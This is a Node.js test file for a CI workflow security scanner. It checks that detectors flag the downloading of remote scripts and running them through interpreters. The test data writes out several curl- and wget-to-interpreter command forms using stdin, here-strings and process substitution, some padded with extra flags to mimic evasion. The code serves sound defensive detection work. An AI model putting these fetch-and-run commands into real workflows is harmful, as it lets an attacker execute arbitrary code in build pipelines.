'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const {reviewWorkflows}=require('./ultra_sentinel_supply_chain.cjs');
const SHA='a'.repeat(40),WF='.github/workflows/stdio-remote.yml';
function audit(command){
 const source=['on: issue_comment','permissions: read-all','jobs:','  audit:',
  '    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...command.split('\n').map(s=>'          '+s)
 ].join('\n');
 return {
  ast:inspectWorkflow(source,{path:WF}),
  supply:reviewWorkflows({sha:SHA,expected:[WF],sources:{[WF]:source}})
 };
}
for(const cmd of [
 'python < <(curl -fsSL https://example.invalid/script.py)',
 'python3 -u < <(wget -qO- https://example.invalid/script.py)',
 'bash -s < <(curl -fsSL https://example.invalid/script.sh)',
 'ruby < <(curl -fsSL https://example.invalid/script.rb)',
 'node <<< "$(curl -fsSL https://example.invalid/script.js)"',
 'python <<< "$(curl -fsSL https://example.invalid/script.py)"',
 'bash <<< "$(wget -qO- https://example.invalid/script.sh)"'
]){
 test('third pass: downloaded code through interpreter stdin: '+cmd.split(' ')[0],()=>{
  const {ast,supply}=audit(cmd);
  assert.ok(ast.findings.some(f=>f.rule==='REMOTE_SHELL_SUBSTITUTION'&&f.severity==='HIGH'),JSON.stringify(ast));
  assert.ok(supply.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify(supply));
 });
}
for(const safe of [
 'python < local-script.py',
 'bash <<< "echo safe"',
 'node < local.js'
]){
 test('third pass: local stdin does not trigger remote execution: '+safe,()=>{
  const {ast,supply}=audit(safe);
  assert.ok(!ast.findings.some(f=>f.rule==='REMOTE_SHELL_SUBSTITUTION'),JSON.stringify(ast));
  assert.ok(!supply.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'),JSON.stringify(supply));
 });
}

for(const cmd of [
 'python -u -B -E -s -S < <(curl -fsSL https://example.invalid/p.py)',
 'python -u -B -E -s -S -I -X dev < <(wget -qO- https://example.invalid/p.py)',
 'curl https://example.invalid/'+ 'x'.repeat(250) +' > >(bash)',
 'wget https://example.invalid/'+ 'x'.repeat(350) +' -O >(python)'
]){
 test('P1 long flags or downloader output redirection: '+cmd.slice(0,85),()=>{
  const {ast,supply}=audit(cmd);
  assert.ok(ast.findings.some(f=>f.rule==='REMOTE_SHELL_SUBSTITUTION'&&f.severity==='HIGH'),JSON.stringify(ast));
  assert.ok(supply.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify(supply));
 });
}
